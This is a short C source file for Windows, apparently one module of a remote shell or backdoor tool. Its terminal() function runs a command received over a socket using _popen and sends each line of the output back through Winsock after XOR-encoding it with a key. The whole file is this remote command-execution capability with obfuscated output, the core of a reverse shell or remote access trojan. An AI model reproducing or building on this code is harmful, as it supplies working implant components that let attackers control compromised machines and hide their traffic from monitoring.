#include <stdio.h>

#include "./includes/shell.h"
#include "./includes/socket.h" // Xor Key Should Be included and winsocked libs

int terminal(char *cmd, SOCKET winsock)
{
    // Open Pipe and write information over socket
    FILE *command;
    // Buffer For Command Output
    char buf[1200] = {0};

    int Return_Code = 1;

    command = _popen(cmd, "r");

    if (command == NULL)
        return FailedPipe;

    // Read Each Line The Command Writes To The Stream and send over Socket
    while (fgets(buf, sizeof(buf), command))
    {
        if (write_xor(buf, winsock, XorKey) <= 0)
        {
            Return_Code = SocketClose;
            break;
        }
    }

    pclose(command);

    return Return_Code;
}